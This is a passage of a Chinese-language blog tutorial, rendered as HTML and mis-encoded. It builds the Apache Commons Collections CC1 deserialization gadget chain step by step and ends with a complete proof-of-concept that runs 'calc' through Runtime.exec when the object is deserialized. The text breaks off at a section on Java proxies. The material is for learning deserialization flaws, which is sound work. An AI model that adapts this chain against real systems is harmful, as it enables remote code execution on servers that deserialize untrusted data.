class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line">        method.invoke(runtime,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240401232921196.png" alt="image-20240401232921196"></p><p>ç„¶åä½¿ç”¨è¿™ä¸ªç±»è¿›è¡Œä»»æ„æ–¹æ³•è°ƒç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RunTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240401234053202.png" alt="image-20240401234053202"></p><p>ç„¶åçœ‹å“ªä¸ªç±»è°ƒç”¨ transform æ–¹æ³•</p><h3 id="TransformedMap-checkSetValue">TransformedMap.checkSetValue</h3><p>æ‰¾åˆ°äº† TransformedMap æ–¹æ³•</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240401234346452.png" alt="image-20240401234346452"></p><p>è¿™é‡Œä¼šè°ƒç”¨ transform æ–¹æ³•</p><p>çœ‹ä¸€ä¸‹æ„é€ å‡½æ•°</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240401234423771.png" alt="image-20240401234423771"></p><p>ç®€å•ç†è§£ä¸ºå¯¹ä¼ å…¥çš„ key ä¸ value è¿›è¡Œæ“ä½œï¼Œæ“ä½œå†…å®¹å°±åœ¨ä¼ å…¥çš„ Transformer é‡Œé¢ï¼Œå°±æ˜¯è¯´åªè¦æˆ‘ä»¬æŠŠ valueTransformer è®¾ç½®ä¸º InvokerTransformer ï¼Œé‚£ä¹ˆè°ƒç”¨ checkSetValue çš„æ—¶å€™å°±ä¼šè°ƒç”¨å…¶transform æ–¹æ³•</p><p>æ¥ç€æˆ‘ä»¬å¯»æ‰¾è°ƒç”¨äº† TransformedMap.checkSetValue çš„ç±»</p><h3 id="AbstractInputCheckedMapDecorator-MapEntry">AbstractInputCheckedMapDecorator.MapEntry</h3><p>æ‰¾åˆ°äº† AbstractInputCheckedMapDecorator ç±»ï¼Œæ³¨æ„ AbstractInputCheckedMapDecorator æ˜¯TransformedMap çš„çˆ¶ç±»</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240402000120986.png" alt="image-20240402000120986"></p><p>åœ¨ MapEntry ä¸­è°ƒç”¨äº† checkSetValue æ–¹æ³•ï¼Œè€Œ MapEntry æ˜¯åœ¨éå†Mapçš„æ—¶å€™ä¼šè°ƒç”¨</p><p>ç»§ç»­æµ‹è¯•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RunTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;Object, Object&gt; map:transformedMap.entrySet())&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">            map.setValue(runtime);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240402002332518.png" alt="image-20240402002332518"></p><p>ç„¶åæˆ‘ä»¬çœ‹çœ‹æœ‰è°çš„ readObject è°ƒç”¨äº† setvalue</p><h3 id="AnnotationInvocationHandler-readObject">AnnotationInvocationHandler.readObject</h3><p>åœ¨ jdk8u71 å‰ ï¼Œ è¯¥ç±»çš„æºç æ˜¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"><span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line"><span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Entry)var4.next();</span><br><span class="line"><span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line"><span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line"><span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line"><span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">        var5.setValue((<span class="keyword">new</span></span><br><span class="line">                      <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 +</span><br><span class="line">        <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸€ä¸ª setValue() å‡½æ•°</p><p>å› ä¸ºAnnotationInvocationHandleræœªæœ‰æè¿°ï¼Œé»˜è®¤ä¸ºDefaultç±»ï¼Œåªèƒ½é€šè¿‡åå°„è°ƒç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RunTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line"><span class="comment">//        for (Map.Entry&lt;Object, Object&gt; map:transformedMap.entrySet())&#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(&quot;1&quot;);</span></span><br><span class="line"><span class="comment">//            map.setValue(runtime);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>constructor.newInstance(Override.class,transformedMap);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä¸€äº›å°é—®é¢˜</strong></p><p>ç¬¬ä¸€ä¸ªå°±æ˜¯æˆ‘ä»¬ä¹‹å‰ setValue çš„æ—¶å€™ç›´æ¥è®¾ç½®Runtimeå¯¹è±¡ï¼Œè€Œè¿™é‡Œæ˜¯AnnotationTypeMismatchExceptionProxy å¯¹è±¡</p><p>ç¬¬äºŒä¸ªé—®é¢˜å°±æ˜¯ Runtime å¯¹è±¡ä¸èƒ½åºåˆ—åŒ–ï¼Œåªèƒ½é€šè¿‡åå°„</p><p>ç¬¬ä¸‰ä¸ªé—®é¢˜å°±æ˜¯æƒ³è¦è°ƒç”¨ setValue è¦æœ‰å‡ ä¸ªifåˆ¤æ–­</p><h3 id="è§£å†³Runtimeå¯¹è±¡åºåˆ—åŒ–">è§£å†³Runtimeå¯¹è±¡åºåˆ—åŒ–</h3><p>Runtime å¯¹è±¡ä¸èƒ½åºåˆ—åŒ–ï¼Œä½†æ˜¯ Runtime.class å¯ä»¥åºåˆ—åŒ–ï¼Œé€šè¿‡åå°„æ¥è°ƒç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span> , <span class="literal">null</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) getRuntimeMethod.invoke(<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">execMethod.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><p>ç„¶åå†å°†å…¶ä¿®æ”¹ä¸º InvokerTransformer ç‰ˆæœ¬</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span> , <span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span> , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125; , <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;).transform(getRuntimeMethod);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå› ä¸ºæ˜¯é‡å¤è°ƒç”¨ï¼Œæ‰€ä»¥è€ƒè™‘ ChainedTransformer</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240402005900939.png" alt="image-20240402005900939"></p><p>å¯ä»¥çœ‹åˆ° ChainedTransformer çš„æ„é€ å‡½æ•°ä¸­ä¼ é€’ä¸€ä¸ªæ–¹æ³•æ•°ç»„å¹¶ä¸”èµ‹å€¼ç»™è¿™ä¸ªå˜é‡ï¼Œç„¶ååœ¨transformä¸­è¿›è¡Œé€’å½’è°ƒç”¨é‚£æˆ‘ä»¬å…ˆå®šä¹‰ä¸€ä¸ª Transformer æ•°ç»„ï¼Œç„¶åä¼ å…¥ ChainedTransformer</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><h3 id="ifåˆ¤æ–­">ifåˆ¤æ–­</h3><p>ç¬¬ä¸€ä¸ªifåˆ¤æ–­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memberType != <span class="literal">null</span></span><br></pre></td></tr></table></figure><p>æ˜¯è®©æˆ‘ä»¬çš„mapé‡Œé¢çš„keyä¸æˆå‘˜æ–¹æ³•ç›¸åŒ</p><p>è·Ÿè¿› Override å‘ç° target é‡Œé¢æœ‰ä¸ª value æ–¹æ³•ï¼Œæ‰€ä»¥å°† Override.class ä¿®æ”¹ä¸º target.class å¹¶ä¸”å°†mapçš„&quot;key&quot;ä¿®æ”¹ä¸º&quot;value&quot;</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240402010756051.png" alt="image-20240402010756051"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240402010823727.png" alt="image-20240402010823727"></p><h3 id="AnnotationTypeMismatchExceptionProxyå¯¹è±¡">AnnotationTypeMismatchExceptionProxyå¯¹è±¡</h3><p>æˆ‘ä»¬èµ°åˆ°è¿™é‡Œçš„æ—¶å€™ä¼šå‘ç°ï¼Œè¿™é‡Œçš„valueæ˜¯ AnnotationTypeMismatchExceptionProxy å¯¹è±¡</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240402010942132.png" alt="image-20240402010942132"></p><p>å›å¿†ä¸€ä¸‹å‰é¢ chainedTransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chainedTransformer.transform(Runtime.class);</span><br></pre></td></tr></table></figure><p>è°ƒç”¨çš„æ˜¯Runtime.classå¯¹è±¡</p><p>è¿™é‡Œå¼•å…¥å¦ä¸€ä¸ªç±»ï¼š ConstantTransformer</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240402011144425.png" alt="image-20240402011144425"></p><p>å¯ä»¥çœ‹åˆ° ConstantTransformer.transform ä¸ç®¡ä¼ å…¥ä»€ä¹ˆéƒ½ä¼šè¿”å›å›ºå®šçš„å€¼</p><p>é‚£ä¹ˆæˆ‘ä»¬åªè¦è®©è¿™ä¸ª iConstantä¸ºRuntime.class å³å¯</p><h3 id="æœ€ç»ˆPOC">æœ€ç»ˆPOC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RunTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//æ„é€ transformersè°ƒç”¨é“¾</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>constructor.newInstance(Target.class,transformedMap);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Javaä»£ç†">Javaä»£ç†:</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ProxyTest.java</span><br><span class="line"><span class="keyword">package</span> daili;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span 